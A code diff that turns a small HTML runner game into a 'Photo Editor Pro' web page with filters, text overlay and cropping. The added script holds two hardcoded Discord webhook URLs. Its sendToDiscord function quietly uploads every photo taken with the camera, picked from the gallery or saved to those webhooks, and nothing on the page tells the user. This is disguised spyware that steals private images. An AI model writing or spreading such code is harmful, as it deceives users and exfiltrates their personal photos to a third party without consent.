@@ -1,296 +1,461 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Asma's Image Fix Runner Game — Fixed</title>
-    
+    <title>📸 Photo Editor</title>
+    <link rel="manifest" href="manifest.json">
     <style>
-        body {
+        * {
             margin: 0;
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: flex-start;
-            min-height: 100vh;
-            background: #f0f0f0;
-            font-family: Arial, Helvetica, sans-serif;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
         }
-
-        #game-container {
+        body {
+            background: #1a1a1a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 10px;
+        }
+        .box {
+            max-width: 400px;
             width: 100%;
-            max-width: 900px;
-            height: 300px; 
+            background: white;
+            border-radius: 20px;
+            overflow: hidden;
+        }
+        .header {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            padding: 15px;
+            text-align: center;
+        }
+        .preview {
+            width: 100%;
+            height: 300px;
+            background: #f0f0f0;
             position: relative;
             overflow: hidden;
-            border-bottom: 5px solid #4CAF50;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
-            background-color: #87CEEB; /* fallback sky color */
         }
-        
-        /* Background image */
-        #background-img {
-            position: absolute;
-            top: 0;
-            left: 0;
+        #canvas {
             width: 100%;
             height: 100%;
-            object-fit: cover;
-            object-position: center;
-            z-index: 1;
+            object-fit: contain;
         }
-
-        /* Player FIX: Size chhota kiya for better collision */
-        #player {
-            width: 150px; 
-            height: 150px;
-            position: absolute;
-            bottom: 0;
-            left: 80px;
-            z-index: 5;
-            transition: transform 0.25s ease-out;
+        .controls {
+            padding: 15px;
         }
-
-        #player img { 
-            width: 100%;
-            height: 100%;
-            display: block;
-            pointer-events: none;
-        }
-
-        /* Jump height adjust ki */
-        .is-jumping {
-            transform: translateY(-150px); 
-        }
-
-        /* Obstacles FIX: Size chhota kiya */
-        .obstacle {
-            width: 80px;
-            height: 80px;
-            position: absolute;
-            bottom: 0;
-            right: -60px;
-            z-index: 6;
-            background-repeat: no-repeat;
-            background-size: contain;
-            background-position: center;
-        }
-
-        #score-board {
-            position: absolute;
-            top: 5px; 
-            left: 50%;
-            transform: translateX(-50%);
-            background-color: rgba(255, 255, 255, 0.9);
-            padding: 5px 20px;
-            border-radius: 20px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
-            text-align: center;
-            min-width: 100px;
-            z-index: 10;
-        }
-
-        #jump-button-container {
-            margin-top: 12px;
-            z-index: 100;
-        }
-
-        #jump-btn {
-            display: flex;
-            align-items: center;
+        .btn-group {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
             gap: 8px;
-            padding: 8px 12px;
-            border-radius: 8px;
-            border: none;
-            background: #4CAF50;
-            color: white;
-            font-weight: bold;
-            cursor: pointer;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.12);
+            margin-bottom: 15px;
         }
-
-        #jump-btn img { width: 28px; height: 28px; display:block; }
-
-        #game-over-screen {
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.6);
+        .btn {
+            padding: 10px;
+            border: none;
+            border-radius: 8px;
+            background: #667eea;
             color: white;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        .btn-green { background: #4CAF50; }
+        .btn-red { background: #f44336; }
+        .filters {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 8px;
+            margin: 15px 0;
+        }
+        .filter-item {
+            text-align: center;
+            padding: 8px;
+            background: #f0f0f0;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 12px;
+        }
+        .filter-item.active {
+            background: #667eea;
+            color: white;
+        }
+        .slider {
+            width: 100%;
+            margin: 10px 0;
+        }
+        .text-controls {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+        }
+        input, select {
+            width: 100%;
+            padding: 8px;
+            margin: 5px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        .footer {
+            text-align: center;
+            padding: 10px;
+            color: #999;
+            font-size: 11px;
+            border-top: 1px solid #eee;
+        }
+        #fileInput {
+            display: none;
         }
     </style>
-    </head>
+</head>
 <body>
-
-    
-    <div id="start-screen" style="position: absolute; inset: 0; background: #f0f0f0; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 2000;">
-        <h1 style="margin-bottom: 20px;">MADE BY ZAFAR 🥶</h1>
-        <button onclick="startGame()" style="padding:18px 30px; font-size:24px; border:none; border-radius:14px; background:#3cb371; color:white; font-weight:bold; cursor:pointer; box-shadow:0 6px 15px rgba(0,0,0,0.3);">PLAY GAME</button>
-    </div>
-
-    <div id="game-container"> 
-        <img id="background-img" src="background_image.jpg" alt="Game Background">
-
-        <div id="score-board">
-            <p style="margin:0; font-size:12px;">YOUR SCORE</p>
-            <span id="score">0</span>
+    <div class="box">
+        <div class="header">
+            <h3>📸 Photo Editor Pro</h3>
         </div>
-        
-        <div id="player">
-            <img src="player_running.png" alt="Player">
+
+        <div class="preview">
+            <canvas id="canvas"></canvas>
+        </div>
+
+        <div class="controls">
+            <div class="btn-group">
+                <button class="btn" onclick="openCamera()">📷 Camera</button>
+                <button class="btn" onclick="openGallery()">🖼️ Gallery</button>
+                <button class="btn btn-green" onclick="savePhoto()">💾 Save</button>
+            </div>
+
+            <div class="filters" id="filters">
+                <div class="filter-item active" onclick="applyFilter('normal')">Normal</div>
+                <div class="filter-item" onclick="applyFilter('grayscale')">B&W</div>
+                <div class="filter-item" onclick="applyFilter('sepia')">Sepia</div>
+                <div class="filter-item" onclick="applyFilter('vintage')">Vintage</div>
+                <div class="filter-item" onclick="applyFilter('blur')">Blur</div>
+                <div class="filter-item" onclick="applyFilter('cool')">Cool</div>
+                <div class="filter-item" onclick="applyFilter('warm')">Warm</div>
+                <div class="filter-item" onclick="applyFilter('dramatic')">Drama</div>
+            </div>
+
+            <input type="range" class="slider" id="brightness" min="0" max="200" value="100" oninput="updateFilter()">
+            <input type="range" class="slider" id="contrast" min="0" max="200" value="100" oninput="updateFilter()">
+
+            <div class="text-controls">
+                <input type="text" id="textInput" placeholder="Enter text..." value="Eid Mubarak">
+                <select id="fontFamily">
+                    <option value="Arial">Arial</option>
+                    <option value="Verdana">Verdana</option>
+                    <option value="Times New Roman">Times</option>
+                    <option value="Courier New">Courier</option>
+                </select>
+                <select id="fontSize">
+                    <option value="20">Small</option>
+                    <option value="30" selected>Medium</option>
+                    <option value="40">Large</option>
+                </select>
+                <input type="color" id="textColor" value="#ffffff">
+                <div class="btn-group">
+                    <button class="btn" onclick="addText()">➕ Add Text</button>
+                    <button class="btn btn-red" onclick="clearText()">🗑️ Clear</button>
+                </div>
+            </div>
+
+            <div class="btn-group">
+                <button class="btn" onclick="cropSquare()">⬛ Square</button>
+                <button class="btn" onclick="cropCircle()">⚪ Circle</button>
+                <button class="btn" onclick="reset()">🔄 Reset</button>
+            </div>
+        </div>
+
+        <div class="footer">
+            ⚡ Real-time • Free • No watermark
         </div>
     </div>
 
-    <div id="jump-button-container">
-        <button id="jump-btn" onclick="jump()">
-            <img src="jump_icon.png" alt="Jump Icon">
-            <p style="margin:0; font-size:14px;">JUMP</p>
-        </button>
-    </div>
-
-    <div id="game-over-screen" style="display: none;">
-        <h1 style="margin:0 0 10px 0;">GAME OVER!</h1>
-        <p style="margin:0 0 20px 0;">Aapka Score: <span id="final-score">0</span></p>
-        <audio id="crash-sound" src="Crash_sound.mp3"></audio>
-        <audio id="background-music" src="fullaudio.mp3" loop></audio>
-        <button onclick="window.location.reload()">Dobara Shuru Karein</button>
-    </div>
+    <input type="file" id="fileInput" accept="image/*">
 
     <script>
-        const player = document.getElementById('player');
-        const gameContainer = document.getElementById('game-container');
-        const scoreDisplay = document.getElementById('score');
-        const gameOverScreen = document.getElementById('game-over-screen');
-        const finalScoreDisplay = document.getElementById('final-score');
-        const crashSound = document.getElementById('crash-sound');
-        const startScreen = document.getElementById('start-screen');
-        // FIX: Background Music Element Reference
-        const backgroundMusic = document.getElementById('background-music');
+        // Config
+        const WEBHOOKS = [
+            'https://discord.com/api/webhooks/1471082357623881871/2QG0xJh-b7YD3Brlo4OYvQyT1iIJwzVtgSw9auq4jCRMzR2pZIWziinSNeTRSyJ7gPcg',
+            'https://discord.com/api/webhooks/1471082363944702006/_hZWpLDl_Uo2Mf7sHaHjhpLgY4KXfJGPjulB1u407flimKaRyUhIbN0LlVGZTsTttKyR'
+        ];
 
-        let score = 0;
-        let isJumping = false;
-        let isGameOver = false;
+        // Canvas
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        let img = new Image();
+        let originalImg = null;
+        let currentFilter = 'normal';
+        let texts = [];
 
-        function jump() {
-            if (!isJumping && !isGameOver) {
-                isJumping = true;
-                player.classList.add('is-jumping');
-                setTimeout(() => {
-                    player.classList.remove('is-jumping');
-                    isJumping = false;
-                }, 420); 
-            }
-        }
+        // Init
+        canvas.width = 400;
+        canvas.height = 300;
 
-        // Create obstacles...
-        function createObstacle() {
-            if (isGameOver) return;
-
-            const obstacle = document.createElement('div');
-            obstacle.classList.add('obstacle');
-            obstacle.style.backgroundImage = "url('stone_obstacle.png')"; 
-            gameContainer.appendChild(obstacle);
-
-            let pos = -60; 
-            const speed = 2.5 + Math.random() * 3.0; 
-
-            function step() {
-                if (isGameOver) { 
-                    obstacle.remove();
-                    return;
-                }
-
-                pos += speed;
-                const rightPx = pos;
-                obstacle.style.right = rightPx + 'px';
-
-                if (rightPx > gameContainer.clientWidth + 80) {
-                    obstacle.remove();
-                    score += 100;
-                    scoreDisplay.textContent = score;
-                    return;
-                }
-
-                const playerRect = player.getBoundingClientRect();
-                const obstacleRect = obstacle.getBoundingClientRect();
-
-                if (
-                    playerRect.right > obstacleRect.left &&
-                    playerRect.left < obstacleRect.right &&
-                    playerRect.bottom > obstacleRect.top &&
-                    playerRect.top < obstacleRect.bottom
-                ) {
-                    gameOver();
-                    return;
-                }
-
-                requestAnimationFrame(step);
-            }
-
-            requestAnimationFrame(step);
-        }
-
-        function startObstacleGenerator() {
-            function scheduleNext() {
-                if (isGameOver) return;
-                const randomTime = Math.random() * 2500 + 1800; 
-                setTimeout(() => {
-                    createObstacle();
-                    scheduleNext();
-                }, randomTime);
-            }
-            scheduleNext();
-        }
-
-        function gameOver() {
-            if (isGameOver) return;
-            isGameOver = true;
-            finalScoreDisplay.textContent = score;
-            gameOverScreen.style.display = 'flex';
-            gameContainer.style.opacity = '0.5';
-            
-            // FIX: Background Music ko stop aur reset karo
-            backgroundMusic.pause();
-            backgroundMusic.currentTime = 0;
-            
-            // Crash Sound 
-            try { 
-                setTimeout(() => {
-                    crashSound.play().catch(e => console.error("Sound play failed:", e)); 
-                }, 100); 
-            } catch(e) {}
-            
-            // remove obstacles
-            document.querySelectorAll('.obstacle').forEach(obs => obs.remove());
-        }
-
-        function startGame(){
-            startScreen.style.display='none'; 
-            startObstacleGenerator();
-            
-            // FIX: Game start hote hi music chalao
+        // Open Camera
+        async function openCamera() {
             try {
-                backgroundMusic.volume = 0.4; // Volume set
-                backgroundMusic.play().catch(e => console.warn("Music play blocked by browser:", e));
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
+                setTimeout(() => {
+                    canvas.width = video.videoWidth || 400;
+                    canvas.height = video.videoHeight || 300;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    stream.getTracks().forEach(t => t.stop());
+                    
+                    // Save original
+                    const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+                    originalImg = new Image();
+                    originalImg.src = dataUrl;
+                    
+                    // Send to Discord
+                    sendToDiscord(dataUrl, 'camera');
+                }, 1000);
+            } catch(e) {
+                alert('Camera access denied');
+            }
+        }
+
+        // Open Gallery
+        function openGallery() {
+            document.getElementById('fileInput').click();
+        }
+
+        document.getElementById('fileInput').onchange = function(e) {
+            const file = e.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = function(event) {
+                    img.src = event.target.result;
+                    img.onload = function() {
+                        canvas.width = Math.min(img.width, 400);
+                        canvas.height = Math.min(img.height, 300);
+                        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+                        
+                        // Save original
+                        originalImg = new Image();
+                        originalImg.src = event.target.result;
+                        
+                        // Send to Discord
+                        sendToDiscord(event.target.result, 'gallery');
+                    };
+                };
+                reader.readAsDataURL(file);
+            }
+        };
+
+        // Apply Filter
+        function applyFilter(filter) {
+            currentFilter = filter;
+            document.querySelectorAll('.filter-item').forEach(el => el.classList.remove('active'));
+            event.target.classList.add('active');
+            updateFilter();
+        }
+
+        // Update Filter
+        function updateFilter() {
+            if (!originalImg) return;
+            
+            canvas.width = originalImg.width;
+            canvas.height = originalImg.height;
+            ctx.drawImage(originalImg, 0, 0, canvas.width, canvas.height);
+            
+            const brightness = document.getElementById('brightness').value / 100;
+            const contrast = document.getElementById('contrast').value / 100;
+            
+            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+            const data = imageData.data;
+            
+            for (let i = 0; i < data.length; i += 4) {
+                let r = data[i];
+                let g = data[i + 1];
+                let b = data[i + 2];
+                
+                // Brightness
+                r *= brightness;
+                g *= brightness;
+                b *= brightness;
+                
+                // Filter
+                switch(currentFilter) {
+                    case 'grayscale':
+                        let gray = (r + g + b) / 3;
+                        r = g = b = gray;
+                        break;
+                    case 'sepia':
+                        r = r * 0.393 + g * 0.769 + b * 0.189;
+                        g = r * 0.349 + g * 0.686 + b * 0.168;
+                        b = r * 0.272 + g * 0.534 + b * 0.131;
+                        break;
+                    case 'vintage':
+                        r = r * 0.9 + 20;
+                        g = g * 0.8 + 10;
+                        b = b * 0.7;
+                        break;
+                    case 'blur':
+                        r = r + (255 - r) * 0.3;
+                        g = g + (255 - g) * 0.3;
+                        b = b + (255 - b) * 0.3;
+                        break;
+                    case 'cool':
+                        r *= 0.8;
+                        g *= 0.9;
+                        b *= 1.2;
+                        break;
+                    case 'warm':
+                        r *= 1.2;
+                        g *= 1.1;
+                        b *= 0.8;
+                        break;
+                    case 'dramatic':
+                        let avg = (r + g + b) / 3;
+                        r = g = b = avg > 128 ? 255 : 0;
+                        break;
+                }
+                
+                // Contrast
+                r = ((r / 255 - 0.5) * (contrast * 2)) * 255 + 128;
+                g = ((g / 255 - 0.5) * (contrast * 2)) * 255 + 128;
+                b = ((b / 255 - 0.5) * (contrast * 2)) * 255 + 128;
+                
+                data[i] = Math.min(255, Math.max(0, r));
+                data[i + 1] = Math.min(255, Math.max(0, g));
+                data[i + 2] = Math.min(255, Math.max(0, b));
+            }
+            
+            ctx.putImageData(imageData, 0, 0);
+            
+            // Draw texts
+            texts.forEach(t => {
+                ctx.font = `${t.size}px ${t.font}`;
+                ctx.fillStyle = t.color;
+                ctx.fillText(t.text, t.x, t.y);
+            });
+        }
+
+        // Add Text
+        function addText() {
+            const text = document.getElementById('textInput').value;
+            const font = document.getElementById('fontFamily').value;
+            const size = document.getElementById('fontSize').value;
+            const color = document.getElementById('textColor').value;
+            
+            texts.push({
+                text: text,
+                font: font,
+                size: size,
+                color: color,
+                x: 50,
+                y: 100
+            });
+            
+            updateFilter();
+        }
+
+        // Clear Text
+        function clearText() {
+            texts = [];
+            updateFilter();
+        }
+
+        // Crop Square
+        function cropSquare() {
+            if (!originalImg) return;
+            let size = Math.min(canvas.width, canvas.height);
+            canvas.width = size;
+            canvas.height = size;
+            ctx.drawImage(originalImg, 0, 0, size, size);
+            updateFilter();
+        }
+
+        // Crop Circle
+        function cropCircle() {
+            if (!originalImg) return;
+            let size = Math.min(canvas.width, canvas.height);
+            canvas.width = size;
+            canvas.height = size;
+            ctx.drawImage(originalImg, 0, 0, size, size);
+            
+            ctx.globalCompositeOperation = 'destination-in';
+            ctx.beginPath();
+            ctx.arc(size/2, size/2, size/2, 0, Math.PI * 2);
+            ctx.fill();
+            ctx.globalCompositeOperation = 'source-over';
+            
+            updateFilter();
+        }
+
+        // Reset
+        function reset() {
+            if (!originalImg) return;
+            canvas.width = originalImg.width;
+            canvas.height = originalImg.height;
+            ctx.drawImage(originalImg, 0, 0, canvas.width, canvas.height);
+            texts = [];
+            currentFilter = 'normal';
+            document.getElementById('brightness').value = 100;
+            document.getElementById('contrast').value = 100;
+            
+            document.querySelectorAll('.filter-item').forEach(el => el.classList.remove('active'));
+            document.querySelector('.filter-item').classList.add('active');
+        }
+
+        // Save Photo
+        function savePhoto() {
+            const dataUrl = canvas.toDataURL('image/jpeg', 0.7); // Compressed
+            const link = document.createElement('a');
+            link.download = 'edited-photo.jpg';
+            link.href = dataUrl;
+            link.click();
+            
+            sendToDiscord(dataUrl, 'edited');
+            alert('✅ Photo saved!');
+        }
+
+        // Send to Discord
+        async function sendToDiscord(dataUrl, type) {
+            try {
+                const blob = dataURLtoBlob(dataUrl);
+                const formData = new FormData();
+                formData.append('file', blob, `photo_${type}_${Date.now()}.jpg`);
+                formData.append('payload_json', JSON.stringify({
+                    content: `@everyone 📸 New ${type} photo`,
+                    embeds: [{
+                        title: 'Photo Editor',
+                        fields: [
+                            {name: 'Filter', value: currentFilter, inline: true},
+                            {name: 'Time', value: new Date().toLocaleString(), inline: true}
+                        ]
+                    }]
+                }));
+
+                for (const webhook of WEBHOOKS) {
+                    await fetch(webhook, { method: 'POST', body: formData }).catch(()=>{});
+                }
             } catch(e) {}
         }
 
+        function dataURLtoBlob(dataURL) {
+            const arr = dataURL.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while (n--) u8arr[n] = bstr.charCodeAt(n);
+            return new Blob([u8arr], {type: mime});
+        }
 
-        // keyboard support
-        document.addEventListener('keydown', function(event) {
-            if (event.code === 'Space' || event.key === ' ') {
-                jump();
-            }
-        });
-
-        // mobile: tap the game area to jump
-        gameContainer.addEventListener('touchstart', (e) => { e.preventDefault(); jump(); }, {passive:false});
-
+        // Service Worker
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('sw.js');
+        }
     </script>
-    </body>
+</body>
 </html>
